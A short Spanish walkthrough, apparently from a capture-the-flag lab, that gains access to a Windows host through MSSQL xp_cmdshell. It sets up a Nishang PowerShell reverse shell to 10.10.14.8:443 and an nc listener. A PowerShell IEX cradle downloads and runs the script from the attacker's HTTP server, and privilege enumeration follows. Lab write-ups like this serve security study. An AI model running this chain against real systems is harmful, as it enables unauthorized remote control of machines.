## Explotacion de vulnerabilidad & Ganando Acceso {-}

### Entablar una reverse shell de typo Powershell {-}

Aqui vamos hacer uso de las powershells reversas de Nishang

```bash
git clone https://github.com/samratashok/nishang
cd nishang
cd Shells
cp Invoke-PowerShellTcp.ps1 /home/.../content/PS.ps1
```

En el fichero PS.ps1, añadimos el invoke del script al final del fichero

```Powershell
Invoke-PowershellTcp -Reverse -IPAddress 10.10.14.8 -Port 443
```

Esto nos permite lanzar el Script directamente despues de descargamiento del fichero en la maquina victima


### Enviamos y ejecutamos la reverse shell {-}

1. montamos un http server con python

    ```bash
    python3 -m http.server 80
    ```

1. En la maquina de atacante en una nueva shell

    ```bash
    rlwrap nc -nlvp 443
    ```

1. en la mssql shell

    ```bash
    xp_cmdshell "powershell IEX(New-Object Net.WebClient).downloadString(\"http://10.10.14.8/PS.ps1\")"
    ```

Ya estamos a dentro.

### Analizamos el sistema {-}

```bash
whoami
ipconfig
[Environment]::Is64BitOperatingSystem
[Environment]::Is64BitProcess
whoami /priv
```
